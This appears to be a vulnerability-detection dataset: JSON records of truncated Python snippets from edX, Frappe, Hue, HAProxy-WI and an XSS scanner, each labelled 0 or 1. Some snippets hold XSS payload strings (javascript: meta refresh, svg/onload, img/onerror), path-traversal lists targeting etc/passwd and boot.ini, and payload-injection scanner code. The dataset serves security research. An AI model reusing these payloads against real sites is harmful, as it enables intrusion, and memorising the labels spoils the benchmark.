\tenv=Environment(loader=FileSystemLoader('templates/ajax'),extensions=['jinja2.ext.loopcontrols', \"jinja2.ext.do\"]) \ttemplate=env.get_template('compare.html') \t \toutput, stderr=funct.subprocess_execute", "label": 0}, {"snippet_id": 1253, "code": "\"Failed to update DB\" else: msg={\"status\": \"Failed\"} except: msg={\"status\": \"Failed\"} return jsonify(msg) @app.route('/scan/scanids/', methods=['GET']) def fetch_scanids(): scanids=[] records=db.scanids", "label": 0}, {"snippet_id": 91, "code": ",value in parsed_query.items(): try: logs.logging.info(\"GET param for xss: %s\",key) xss_payloads=fetch_xss_payload() for payload in xss_payloads: if result is not True: xss_url=url.replace(value[0], payload", "label": 1}, {"snippet_id": 27290, "code": " page\" try: r=requests.get(url) s=r.content.replace(\">\", \">\\n\") with open(\"tmpage.txt\", \"w\") as f: f.write(s) scan_for_forms(\"tmpage.txt\", host, url) os.remove(\"tmpage.txt\") except Exception, e: print \"", "label": 1}, {"snippet_id": 17847, "code": "/ANUx$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'ANUx'}), url(r'^(?i)university_profile/EPFLx$', 'courseware.views.static_university_profile', name", "label": 0}, {"snippet_id": 14712, "code": "=name)) def test_testcase_spec(self): spec='test_foo.py:FooTest.test_bar' suite=BokChoyTestSuite('', test_spec=spec) name='tests/{}'.format(spec) self.assertEqual(suite.cmd, self._expected_command(name", "label": 0}, {"snippet_id": 4849, "code": "\"\"\"<img style=\"xss:expr/*xss*/ession(alert('xss'))\"> \"\"\", \"\"\"<meta http-equiv=\"refresh\" content=\"0;url=javascript:alert('xss');\">\"\"\", \"\"\"<meta http-equiv=\"refresh\" content=\"0;url=data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K", "label": 0}, {"snippet_id": 43119, "code": ")})] \t\tif constants: \t\t\tvalues=frappe.db.get_value(self.doctype, self.name, constants, as_dict=True) \t\tfor fieldname in constants: \t\t\tdf=self.meta.get_field(fieldname) \t\t\t \t\t\tif df.fieldtype=='Date' or", "label": 0}, {"snippet_id": 2634, "code": " host_header_xss.text.find(decoded_payload) !=-1: impact=\"Low\" print \"%s[{0}]{1} is vulnerable to XSS%s\".format(impact,url)%(api_logger.G, api_logger.W) attack_result={ \"id\": 11, \"scanid\": scanid, \"url\": url,", "label": 0}, {"snippet_id": 31078, "code": ".system(\"rm -f %s\" % script) \tsql.update_server_master(master, slave) \t if form.getvalue('masteradd'): \tmaster=form.getvalue('masteradd') \tslave=form.getvalue('slaveadd') \tinterface=form.getvalue('interfaceadd", "label": 0}, {"snippet_id": 20200, "code": " self.imports_dir: sh( \"DEFAULT_STORE={default_store}\" \"./manage.py cms --settings=bok_choy import{import_dir}\".format( default_store=self.default_store, import_dir=self.imports_dir ) ) def load_data(self)", "label": 0}, {"snippet_id": 37136, "code": "\t} \tposts=frappe.db.sql(query, as_dict=1) \tfor post in posts: \t\tpost.cover_image=find_first_image(post.content) \t\tpost.published=global_date_format(post.creation) \t\tpost.content=strip_html_tags(post.content", "label": 0}, {"snippet_id": 45147, "code": "=coordinator_id) coordinator=Coordinator(document=doc) else: coordinator=Coordinator() api=get_oozie(request.user) credentials=Credentials() try: credentials.fetch(api) except Exception, e: LOG.error(smart_str(e)", "label": 0}, {"snippet_id": 49229, "code": " int(c)==self.column_id: if column.startswith(\"-\"): new_query.append(c) else: new_query.append('-{}'.format(c)) else: new_query.append(column) return self.get_url_with_query_params({ self.ordering_query_param", "label": 0}, {"snippet_id": 31690, "code": "(grid) \t if form.getvalue('get_hap_v'): \toutput=funct.check_haproxy_version(serv) \tprint(output) \t if form.getvalue('bwlists'): \tlist=os.path.dirname(os.getcwd())+\"/\"+sql.get_setting('lists_path')+\"/\"+form", "label": 0}, {"snippet_id": 22134, "code": " django.contrib.auth.views if settings.DEBUG or settings.MITX_FEATURES.get('ENABLE_DJANGO_ADMIN_SITE'): admin.autodiscover() urlpatterns=('', url(r'^update_certificate$', 'certificates.views.update_certificate", "label": 0}, {"snippet_id": 45991, "code": "\"resultset-widget\", \"id\":\"14023aef-b233-9420-96c6-15d48293532b\", \"properties\":{},\"offset\":0,\"isLoading\":True,\"klass\":\"card card-widget span12\"}]}], \"drops\":[\"temp\"],\"klass\":\"card card-home card-column span10", "label": 0}, {"snippet_id": 12095, "code": "'^mktg/(?P<course_id>.*)$', 'courseware.views.mktg_course_about', name=\"mktg_about_course\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/$', 'courseware.views.course_info', name=\"course_root\"), url(r", "label": 0}, {"snippet_id": 11624, "code": "[^/]*)$', 'student.views.activate_account', name=\"activate\"), url(r'^begin_exam_registration/(?P<course_id>[^/]+/[^/]+/[^/]+)$', 'student.views.begin_exam_registration', name=\"begin_exam_registration\")", "label": 0}, {"snippet_id": 18461, "code": "(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/gradebook$', 'instructor.views.gradebook', name='gradebook'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/grade_summary$', 'instructor.views.grade_summary", "label": 0}, {"snippet_id": 19865, "code": "=kwargs.get('report_dir', Env.BOK_CHOY_REPORT_DIR) self.xunit_report=self.report_dir / \"xunit.xml\" self.cache=Env.BOK_CHOY_CACHE self.fasttest=kwargs.get('fasttest', False) self.serversonly=kwargs.get(", "label": 0}, {"snippet_id": 50866, "code": "\"send_prompt\": True}) self.send_text(*args, **kwargs) def send_default(self, cmdname, *args, **kwargs): \"\"\" Data Evennia -> User. Args: cmdname(str): The first argument will always be the oob cmd name. *args", "label": 0}, {"snippet_id": 1043, "code": "=parsed_url.scheme+\"://\"+parsed_url.netloc+parsed_url.path+\"/?\"+parsed_url.query.replace(value[0], payload) xss_request=req.api_request(xss_url,\"GET\",headers) print xss_request.text if xss_request.text", "label": 1}, {"snippet_id": 35210, "code": "(df.fieldname))) \t\t\t\telif df.fieldtype in(\"Float\", \"Currency\", \"Percent\"): \t\t\t\t\tself.set(df.fieldname, flt(self.get(df.fieldname))) \t\tif self.docstatus is not None: \t\t\tself.docstatus=cint(self.docstatus)", "label": 0}, {"snippet_id": 17050, "code": "'open_ended_flagged_problems_take_action'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts$', 'course_groups.views.list_cohorts', name=\"cohorts\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+", "label": 0}, {"snippet_id": 44514, "code": "'Workflows copied.') if len(jobs) > 1 else _('Workflow copied.')) return HttpResponse(json.dumps(response), mimetype=\"application/json\") @check_document_modify_permission() def save_workflow(request): response", "label": 0}, {"snippet_id": 3722, "code": "'].find('application/json') !=-1 or res_headers['Content-Type'].find('text/plain') !=-1: impact=\"Low\" else: impact=\"High\" else: impact=\"Low\" return impact def xss_payload_decode(payload): decoded_payload", "label": 0}, {"snippet_id": 35532, "code": "(is_submittable or self.meta.is_submittable) and frappe.get_meta(doctype).is_submittable \t\t\t\t\t\tand cint(frappe.db.get_value(doctype, docname, \"docstatus\"))==2): \t\t\t\t\t\tcancelled_links.append((df.fieldname", "label": 0}, {"snippet_id": 22287, "code": "'^create_exam_registration$', 'student.views.create_exam_registration'), url(r'^password_reset/$', 'student.views.password_reset', name='password_reset'), url(r'^password_change/$', django.contrib.auth.views", "label": 0}, {"snippet_id": 22404, "code": "/ANUx$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'ANUx'}), url(r'^(?i)university_profile/EPFLx$', 'courseware.views.static_university_profile', name", "label": 0}, {"snippet_id": 38205, "code": "\t\t\twhere `tabBlog Post`.blog_category=`tabBlog Category`.name and published=1) \t\torder by title asc\"\"\", as_dict=1) def clear_blog_cache(): \tfor blog in frappe.db.sql_list(\"\"\"select route from \t\t`tabBlog", "label": 0}, {"snippet_id": 14218, "code": "<student_username>[^/]*)/(?P<location>.*?)$', 'courseware.views.submission_history', name='submission_history'), ) if settings.ENABLE_JASMINE: urlpatterns +=(url(r'^_jasmine/', include('django_jasmine.urls')", "label": 0}, {"snippet_id": 51148, "code": "(last_run_at=obj.last_run_at) else: z, y=obj.schedule.is_due(last_run_at=datetime.now(pytz.utc)) date=datetime.now(pytz.utc) +timedelta(seconds=y) return date class Meta: ordering=[\"-name\"] class IECrontabSchedule", "label": 0}, {"snippet_id": 38845, "code": "\t\t\treturn value \t\telse: \t\t\t \t\t\t \t\t\tif(getattr(self, '_metaclass', None) \t\t\t\tor self.__class__.__name__ in('Meta', 'FormMeta', 'DocField')): \t\t\t\treturn value \t\t\traise ValueError( \t\t\t\t'Document for field", "label": 0}, {"snippet_id": 2754, "code": " '%3F', '%26', '%3D'] for uri_list in uri_check_list: if uri_list in url: parsed_url=urlparse.urlparse(url).scheme+\"://\"+urlparse.urlparse(url).netloc+urlparse.urlparse(url).path break if parsed_url=='", "label": 0}, {"snippet_id": 4365, "code": "(/xss/)</script>\" def img(self): return '<img/onerror=\"%s\"/src=x>' % payload def svg(self, payload): return '<svg/onload=\"%s\"/>' % payload def style(self, payload): return '<style/onload=\"%s\"></style>'", "label": 1}, {"snippet_id": 48160, "code": "\" +str(m.pk)) def action_add_single_media(request: HttpRequest): try: headline=request.POST[\"headline\"] category=request.POST[\"category\"] text=request.POST[\"text\"] file=request.FILES['file'] user: Profile", "label": 0}, {"snippet_id": 17840, "code": "\"static_university_profile\", kwargs={'org_id': 'RiceX'}), url(r'^(?i)university_profile/ANUx$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'ANUx'}), url(r'^", "label": 0}, {"snippet_id": 49245, "code": ".get_url_with_query_params({ self.ordering_query_param: \".\".join(new_query) }) class SmartColumn(TitleFromModelFieldMixin, object): def __init__(self, model, field, column_id, query_params, ordering_query_param, label=None,", "label": 0}, {"snippet_id": 7235, "code": "'static_template_view.views.render', {'template': '404.html'}, name=\"404\"), ) if not settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]: urlpatterns +=( url(r'^jobs$', 'static_template_view.views.render', {'template", "label": 0}, {"snippet_id": 19728, "code": " import colorize except ImportError: colorize=lambda color, text: text __test__=False DEFAULT_NUM_PROCESSES=1 DEFAULT_VERBOSITY=2 class BokChoyTestSuite(TestSuite): \"\"\" TestSuite for running Bok Choy tests", "label": 0}, {"snippet_id": 10558, "code": "\"\"\" Class used for defining and running Bok Choy acceptance test suite \"\"\" from time import sleep from urllib import urlencode from common.test.acceptance.fixtures.course import CourseFixture, FixtureError", "label": 0}, {"snippet_id": 16124, "code": "'^reject_name_change$', 'student.views.reject_name_change'), url(r'^pending_name_changes$', 'student.views.pending_name_changes'), url(r'^event$', 'track.views.user_track'), url(r'^t/(?P<template>[^/]*)$'", "label": 0}, {"snippet_id": 33773, "code": "=frappe.db.get_value(\"Blogger\",{\"name\": frappe.local.form_dict.blogger}, \"full_name\") \t\tlist_context.sub_title=_(\"Posts by{0}\").format(blogger) \t\tlist_context.title=blogger \telif frappe.local.form_dict.txt:", "label": 0}, {"snippet_id": 10768, "code": ") self.serversonly=kwargs.get('serversonly', False) self.testsonly=kwargs.get('testsonly', False) self.test_spec=kwargs.get('test_spec', None) self.default_store=kwargs.get('default_store', None) self.verbosity", "label": 0}, {"snippet_id": 18169, "code": " url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/mktg-about$', 'courseware.views.mktg_course_about', name=\"mktg_about_course\"), url(r'^mktg/(?P<course_id>.*)$', 'courseware.views.mktg_course_about', name=", "label": 0}, {"snippet_id": 43406, "code": "\", \"Code\", \"Small Text\") and df.get(\"options\")==\"Email\": \t\t\t\tsanitized_value=sanitize_email(value) \t\t\telif df and(df.get(\"ignore_xss_filter\") \t\t\t\t\t\tor(df.get(\"fieldtype\")==\"Code\" and df.get(\"options\")!", "label": 0}, {"snippet_id": 15756, "code": " self.test_spec: test_spec=self.test_dir else: test_spec=self.test_dir / self.test_spec if self.serversonly: return \"\" cmd=[ \"DEFAULT_STORE={}\".format(self.default_store), \"SCREENSHOT_DIR='{}'\".format(self", "label": 0}, {"snippet_id": 23975, "code": "'/shard_' +self.shard if self.shard else '' ) ) suite=BokChoyTestSuite('', num_processes=1) self.assertEqual(BokChoyTestSuite.verbosity_processes_string(suite), expected_verbosity_string) def test_verbosity_settings_2_processes", "label": 0}, {"snippet_id": 8901, "code": "', 'perfstats.views.end_profile'),) if settings.WIKI_ENABLED: from wiki.urls import get_pattern as wiki_pattern from django_notify.urls import get_pattern as notify_pattern urlpatterns +=( url('^wiki/create", "label": 0}, {"snippet_id": 41468, "code": ", %(page_len)s\"\"\" %{ \t\t\t\"start\": limit_start, \"page_len\": limit_page_length, \t\t\t\t\"condition\":(\" and \" +\" and \".join(conditions)) if conditions else \"\" \t\t} \tposts=frappe.db.sql(query, as_dict=1) \tfor post", "label": 0}, {"snippet_id": 12829, "code": "-login-identity'), url(r'^openid/provider/identity/$', 'external_auth.views.provider_identity', name='openid-provider-identity'), url(r'^openid/provider/xrds/$', 'external_auth.views.provider_xrds', name", "label": 0}, {"snippet_id": 29772, "code": "=True) \tif format=='cfg': \t\tfor file in files: \t\t\tip=file.split(\"-\") \t\t\tif serv==ip[0]: \t\t\t\treturn_files.add(file) \t\treturn sorted(return_files, reverse=True) \telse: \t\treturn files \t def get_key(item):", "label": 0}, {"snippet_id": 42429, "code": " \t\td=self.get_valid_dict(convert_dates_to_str=True) \t\tcolumns=list(d) \t\ttry: \t\t\tfrappe.db.sql(\"\"\"insert into `tab{doctype}` \t\t\t\t({columns}) values({values})\"\"\".format( \t\t\t\t\tdoctype=self.doctype, \t\t\t\t\tcolumns", "label": 0}, {"snippet_id": 3820, "code": ":body, \"res_headers\": xss_request.headers,\"res_body\": xss_request.text} dbupdate.insert_record(attack_result) db_update=True vul_param +=key else: result=True if vul_param=='': post_vul_param +=key else:", "label": 0}, {"snippet_id": 30916, "code": "\tfunct.get_config(serv, cfg) \telse: \t\tcfg=hap_configs_dir +form.getvalue('configver') \t\t\t \ttry: \t\tconf=open(cfg, \"r\") \texcept IOError: \t\tprint('<div class=\"alert alert-danger\">Can\\'t read import config", "label": 0}, {"snippet_id": 40508, "code": "[fieldname]=None \t\t\tdoctype=self.meta.get_field(parentfield).options if parentfield else self.doctype \t\t\tdf=frappe.get_meta(doctype).get_field(fieldname) \t\t\tif df.fieldtype in(\"Currency\", \"Float\", \"Percent\")", "label": 0}, {"snippet_id": 32367, "code": "% origin) elif os.path.isfile(os.path.join(args.directory, 'README.md')): print(' Try loading %s/README.md' % origin) retcode=1 try: s.serve_forever() except KeyboardInterrupt: retcode=130 except Exception", "label": 0}, {"snippet_id": 42827, "code": "\t\t\tdocname=self.get(df.fieldname) \t\t\tif docname: \t\t\t\tif df.fieldtype==\"Link\": \t\t\t\t\tdoctype=df.options \t\t\t\t\tif not doctype: \t\t\t\t\t\tfrappe.throw(_(\"Options not set for link field{0}\").format(df.fieldname)", "label": 0}, {"snippet_id": 557, "code": " check_xss_impact(res_headers): if res_headers['Content-Type']: if 'application/json' or 'text/plain' in xss_request['Content-Type']: impact=\"Low\" else: impact=\"High\" else: impact=\"Low\" return impact def xss_get_url", "label": 1}, {"snippet_id": 29617, "code": "\treturn stdout.read().decode(encoding='UTF-8') \t\t\t \t\tfor line in stderr.read().decode(encoding='UTF-8'): \t\t\tif line: \t\t\t\tprint(\"<div class='alert alert-warning'>\"+line+\"</div>\") \ttry:\t \t\tssh.close() \texcept", "label": 0}, {"snippet_id": 16242, "code": ".password_reset_complete, name='auth_password_reset_complete'), url(r'^password_reset_done/$', django.contrib.auth.views.password_reset_done, name='auth_password_reset_done'), url(r'^heartbeat$', include('heartbeat", "label": 0}, {"snippet_id": 30477, "code": "/syslog.log | sed '/ %s:00/,/ %s:00/! d' |tail -%s %s %s\" %(serv, date, date1, rows, grep_act, grep)] \t\tsyslog_server=sql.get_setting('syslog_server') \t \tif waf==\"1\": \t\tlocal_path_logs='/var/log/modsec_audit", "label": 0}, {"snippet_id": 41856, "code": " default) \t\t\tif value is None and key not in self.ignore_in_getter \\ \t\t\t\tand key in(d.fieldname for d in self.meta.get_table_fields()): \t\t\t\tself.set(key,[]) \t\t\t\tvalue=self.__dict__.get(key) \t\t\treturn value", "label": 0}, {"snippet_id": 17156, "code": "'open_ended_grading.views.peer_grading', name='peer_grading'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/notes$', 'notes.views.notes', name='notes'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/notes/',", "label": 0}, {"snippet_id": 1543, "code": " method=content['method'] api=\"Y\" scan_status=scan_single_api(url, method, headers, body, api, scanid) if scan_status is True: msg={\"status\": scanid} try: db.scanids.insert({\"scanid\": scanid, \"name\": name", "label": 0}, {"snippet_id": 29012, "code": "=sql.get_setting('stats_port') \tserver_state_file=sql.get_setting('server_state_file') \tstats_user=sql.get_setting('stats_user') \tstats_password=sql.get_setting('stats_password') \tproxy=sql.get_setting", "label": 0}, {"snippet_id": 6188, "code": " EduID IdP spawns multiple threads to make use of all CPU cores in the password pre-hash function. Number of threads should probably be about 2x number of cores to 4x number of cores(if hyperthreading is", "label": 0}, {"snippet_id": 28475, "code": ".environ.get(\"HTTP_COOKIE\")) \t\tuser_uuid=cookie.get('uuid') \t\tlogin=sql.get_user_name_by_uuid(user_uuid.value) \texcept: \t\tpass \t\t \tif kwargs.get('alerting')==1: \t\tmess=get_data('date_in_log') +action +\"\\n", "label": 0}, {"snippet_id": 10936, "code": "\") bokchoy_utils.clear_mongo() def verbosity_processes_string(self): \"\"\" Multiprocessing, xunit, color, and verbosity do not work well together. We need to construct the proper combination for use with", "label": 0}, {"snippet_id": 335, "code": "' url_query=urlparse.urlparse(url) parsed_query=urlparse.parse_qs(url_query.query) if parsed_query: for key,value in parsed_query.items(): try: logs.logging.info(\"GET param for xss: %s\",key) xss_payloads", "label": 1}, {"snippet_id": 37304, "code": " Post` \t\t\twhere ifnull(blogger,'')=tabBlogger.name) \t\t\twhere name=%s\"\"\",(self.blogger,)) \tdef on_update(self): \t\tclear_cache(\"writers\") \tdef get_context(self, context): \t\t \t\tif not cint(self.published)", "label": 0}, {"snippet_id": 43444, "code": "\t\t\telse: \t\t\t\tsanitized_value=sanitize_html(value, linkify=df.fieldtype=='Text Editor') \t\t\tself.set(fieldname, sanitized_value) \tdef _save_passwords(self): \t\t'''Save password field values in __Auth table", "label": 0}, {"snippet_id": 28298, "code": " title=\"Working with HAProxy configs\", \t\t\t\t\t\t\trole=role, \t\t\t\t\t\t\taction=\"config.py\", \t\t\t\t\t\t\tuser=user, \t\t\t\t\t\t\tselect_id=\"serv\", \t\t\t\t\t\t\tserv=serv, \t\t\t\t\t\t\taftersave=aftersave, \t\t\t\t\t\t\tconfig=config_read, \t", "label": 0}, {"snippet_id": 42683, "code": ".docstatus is not None: \t\t\tself.docstatus=cint(self.docstatus) \tdef _get_missing_mandatory_fields(self): \t\t\"\"\"Get mandatory fields that do not have any values\"\"\" \t\tdef get_msg(df): \t\t\tif df.fieldtype==\"Table\"", "label": 0}, {"snippet_id": 18604, "code": " url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)$', 'course_groups.views.users_in_cohort', name=\"list_cohort\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P", "label": 0}, {"snippet_id": 38232, "code": "\"): \t\tclear_cache(blog) \tclear_cache(\"writers\") def get_blog_category(route): \treturn frappe.db.get_value(\"Blog Category\",{\"name\": route}, \"title\") or route def get_blog_list(doctype, txt=None, filters", "label": 0}, {"snippet_id": 46034, "code": " try: collection_doc=Document2.objects.get(id=collection_id) if USE_NEW_EDITOR.get(): collection_doc.can_read_or_exception(request.user) else: collection_doc.doc.get().can_read_or_exception(request.user", "label": 0}, {"snippet_id": 21792, "code": "', name=\"static_tab\"), ) if settings.MITX_FEATURES.get('ENABLE_STUDENT_HISTORY_VIEW'): urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/submission_history/(?P<student_username>[^/]*)/(?P", "label": 0}, {"snippet_id": 2280, "code": "\"+parsed_url.netloc+parsed_url.path+\"/?\"+parsed_url.query.replace(value[0], payload) xss_request=req.api_request(xss_url,\"GET\",headers) decoded_payload=xss_payload_decode(payload) print decoded_payload", "label": 0}, {"snippet_id": 41830, "code": "\t\t\tif isinstance(filters, dict): \t\t\t\t\tvalue=_filter(self.__dict__.get(key,[]), filters, limit=limit) \t\t\t\telse: \t\t\t\t\tdefault=filters \t\t\t\t\tfilters=None \t\t\t\t\tvalue=self.__dict__.get(key, default) \t\t\telse:", "label": 0}, {"snippet_id": 966, "code": "%s[{0}]{1} is vulnerable to XSS%s\".format(impact,url)%(api_logger.G, api_logger.W) attack_result={ \"id\": 11, \"scanid\": scanid, \"url\": url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers", "label": 1}, {"snippet_id": 30313, "code": ") \tstats_port=sql.get_setting('stats_port') \tstats_page=sql.get_setting('stats_page') \ttry: \t\tresponse=requests.get('http://%s:%s/%s' %(serv, stats_port, stats_page), auth=(haproxy_user, haproxy_pass))", "label": 0}, {"snippet_id": 43001, "code": ".append((df.fieldname, docname, get_msg(df, docname))) \t\treturn invalid_links, cancelled_links \tdef _validate_selects(self): \t\tif frappe.flags.in_import: \t\t\treturn \t\tfor df in self.meta.get_select_fields(", "label": 0}, {"snippet_id": 35025, "code": " \t\t\t\t\t\tself.name=None \t\t\t\t\t\tself.db_insert() \t\t\t\t\t\treturn \t\t\t\t\traise frappe.DuplicateEntryError(self.doctype, self.name, e) \t\t\t\telif \"Duplicate\" in cstr(e.args[1]): \t\t\t\t\t \t\t\t\t\tself.show_unique_validation_message", "label": 0}, {"snippet_id": 12724, "code": "'AUTH_USE_OPENID'): urlpatterns +=( url(r'^openid/login/$', 'django_openid_auth.views.login_begin', name='openid-login'), url(r'^openid/complete/$', 'external_auth.views.openid_login_complete', name='openid", "label": 0}, {"snippet_id": 26735, "code": "%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini', '../../boot.ini%00', '../../../boot.ini%00', '../../../../boot.ini%00', '../../.", "label": 0}, {"snippet_id": 36487, "code": ")}): \t\t\t\textract_images_from_doc(self, df.fieldname) def _filter(data, filters, limit=None): \t\"\"\"pass filters as: \t\t{\"key\": \"val\", \"key\":[\"!=\", \"val\"], \t\t\"key\":[\"in\", \"val\"], \"key\":[\"not in\", \"val\"], \"key", "label": 0}, {"snippet_id": 46475, "code": "'There is no collection to search.') return JsonResponse(response) def no_collections(request): return render('no_collections.mako', request,{'is_embeddable': request.GET.get('is_embeddable', False)}) def", "label": 0}, {"snippet_id": 41476, "code": "\" and \" +\" and \".join(conditions)) if conditions else \"\" \t\t} \tposts=frappe.db.sql(query, as_dict=1) \tfor post in posts: \t\tpost.cover_image=find_first_image(post.content) \t\tpost.published=global_date_format", "label": 0}, {"snippet_id": 49619, "code": ", field, self.query_params, self.object_list) for i, field in enumerate(self.list_filter, start=1) ] if self.list_filter else[] def get_columns(self): \"\"\" Transform list_display into list of SmartColumns", "label": 0}, {"snippet_id": 49884, "code": " help\", \"what is my purpose\", \"donate to us via bitcoin at:{{ bitcoin_address}}\", \"donate to us via paypal at:{{ paypal_address}}\", \"donate to us via venmo at:{{ venmo_address}}\", \"donate to us via beemit", "label": 1}, {"snippet_id": 46056, "code": " collection=Collection2(request.user, document=collection_doc) except Exception, e: raise PopupException(e, title=_(\"Dashboard does not exist or you don't have the permission to access it.\")) query={'qs", "label": 0}, {"snippet_id": 29932, "code": "'/keys/'): \t\tos.makedirs(os.getcwd()+'/keys/') \t \tssh_keys=os.path.dirname(os.getcwd())+'/keys/'+name+'.pem' \t \ttry: \t\twith open(ssh_keys, \"w\") as conf: \t\t\tconf.write(form.getvalue('ssh_cert')) \texcept", "label": 0}, {"snippet_id": 50057, "code": " \"\"\" An ajax/comet long-polling transport \"\"\" isLeaf=True allowedMethods=('POST',) def __init__(self): self.requests={} self.databuffer={} self.last_alive={} self.keep_alive=None def _responseFailed(self", "label": 0}, {"snippet_id": 22363, "code": ", kwargs={'org_id': 'WellesleyX'}), url(r'^(?i)university_profile/McGillX$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'McGillX'}), url(r'^(?i)university_profile", "label": 0}, {"snippet_id": 3515, "code": " result='' logs.logging.info(\"GET param for xss: %s\",key) xss_payloads=fetch_xss_payload() for payload in xss_payloads: if result is not True: parsed_url=urlparse.urlparse(url) xss_url=parsed_url.scheme+\":", "label": 0}, {"snippet_id": 3204, "code": ": result=True if vul_param=='': post_vul_param +=key else: post_vul_param +=','+key if post_vul_param: dbupdate.update_record({\"scanid\": scanid},{\"$set\":{\"scan_data\": post_vul_param+\" are vulnerable to", "label": 0}, {"snippet_id": 27885, "code": ".should_render_json( self.request.headers.get('accept', ''), self.response.headers.get('Content-Type')): self.render_json(values, 500) else: self.render('error.html', values, 500) def redirect(self, url, **kwargs):", "label": 0}, {"snippet_id": 51101, "code": " obj.last_run_at: return obj.schedule.remaining_estimate(last_run_at=obj.last_run_at) else: z, y=obj.schedule.is_due(last_run_at=datetime.now(pytz.utc)) date=datetime.now(pytz.utc) +timedelta(seconds=y", "label": 0}, {"snippet_id": 1900, "code": ".api_request(url, \"POST\", headers, temp_body) decoded_payload=xss_payload_decode(payload) if xss_post_request.text.find(decoded_payload) !=-1: impact=check_xss_impact(xss_post.body) if db_update is not", "label": 1}, {"snippet_id": 5367, "code": "'tbody', 'td', 'template', 'textarea', 'tfoot', 'th', 'thead', 'time', 'title', 'tr', 'track', 'tt', 'u', 'ul', 'var', 'video', 'wbr', 'xmp', ] _events=[ 'onabort', 'onautocomplete', 'onautocompleteerror'", "label": 0}, {"snippet_id": 20662, "code": ">[^/]*)$', 'student.views.confirm_email_change'), url(r'^change_name$', 'student.views.change_name_request', name=\"change_name\"), url(r'^accept_name_change$', 'student.views.accept_name_change'), url(r", "label": 0}, {"snippet_id": 43891, "code": "\t\t\tself.set(df.fieldname, ref_doc.get(df.fieldname)) \tdef get_value(self, fieldname): \t\tdf=self.meta.get_field(fieldname) \t\tval=self.get(fieldname) \t\treturn self.cast(val, df) \tdef cast(self, value, df", "label": 0}, {"snippet_id": 34980, "code": "=list(d) \t\ttry: \t\t\tfrappe.db.sql(\"\"\"insert into `tab{doctype}` \t\t\t\t({columns}) values({values})\"\"\".format( \t\t\t\t\tdoctype=self.doctype, \t\t\t\t\tcolumns=\", \".join([\"`\"+c+\"`\" for c in columns]), \t\t\t\t\tvalues=\"", "label": 0}, {"snippet_id": 8621, "code": ", 'student.views.password_reset', name='password_reset'), url(r'^password_change/$', django.contrib.auth.views.password_change, name='auth_password_change'), url(r'^password_change_done/$', django.contrib", "label": 0}, {"snippet_id": 19453, "code": "( \"--with-xunitmp --xunitmp-file={repo_dir}/reports/bok_choy{shard_str}/xunit.xml\" \" --processes={procs} --no-color --process-timeout=1200\".format( repo_dir=REPO_DIR, shard_str='/shard_' +self.shard if", "label": 0}, {"snippet_id": 23961, "code": "\"\"\" expected_verbosity_string=( \"--with-xunit --xunit-file={repo_dir}/reports/bok_choy{shard_str}/xunit.xml --verbosity=2\".format( repo_dir=REPO_DIR, shard_str='/shard_' +self.shard if self.shard else ", "label": 0}, {"snippet_id": 55017, "code": " translation=t, project=project, ) for t in( Translation.objects .filter(pk__in=changed_translation_pks) .prefetch_related('entity__resource') ) ] TranslationMemoryEntry.objects.bulk_create(memory_entries", "label": 0}, {"snippet_id": 26541, "code": "%2e%2f%2e%2e%2fetc%2fpasswd', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd', '../../etc/passwd%00', '../../../etc/passwd%00', '../../../../etc/passwd%00', '../../", "label": 0}, {"snippet_id": 18959, "code": "), url(r'^migrate/reload/(?P<reload_dir>[^/]+)$', 'lms_migration.migrate.manage_modulestores'), url(r'^migrate/reload/(?P<reload_dir>[^/]+)/(?P<commit_id>[^/]+)$', 'lms_migration.migrate.manage_modulestores", "label": 0}, {"snippet_id": 13568, "code": "'courseware.module_render.xqueue_callback', name='xqueue_callback'), url(r'^change_setting$', 'student.views.change_setting', name='change_setting'), url(r'^calculate$', 'util.views.calculate'), url(r'^courses/", "label": 0}, {"snippet_id": 53684, "code": " request.fs, request.jt, properties=properties) job_id=submission.run() return job_id except RestException, ex: raise PopupException(_(\"Error submitting bundle %s\") %(bundle,), detail=ex._headers.get('oozie", "label": 0}, {"snippet_id": 43359, "code": "\treturn \t\tfor fieldname, value in self.get_valid_dict().items(): \t\t\tif not value or not isinstance(value, string_types): \t\t\t\tcontinue \t\t\tvalue=frappe.as_unicode(value) \t\t\tif(u\"<\" not in value and u\">\" not in", "label": 0}, {"snippet_id": 37332, "code": " published yet!\") \t\t \t\tcontext.full_name=get_fullname(self.owner) \t\tcontext.updated=global_date_format(self.published_on) \t\tif self.blogger: \t\t\tcontext.blogger_info=frappe.get_doc(\"Blogger\", self.blogger)", "label": 0}, {"snippet_id": 23398, "code": "'): urlpatterns +=( url(r'^shib-login/$', 'external_auth.views.shib_login', name='shib-login'), ) if settings.MITX_FEATURES.get('RESTRICT_ENROLL_BY_REG_METHOD'): urlpatterns +=( url(r'^course_specific_login", "label": 0}, {"snippet_id": 19927, "code": ".BOK_CHOY_A11Y_CUSTOM_RULES_FILE self.imports_dir=kwargs.get('imports_dir', None) self.coveragerc=kwargs.get('coveragerc', None) 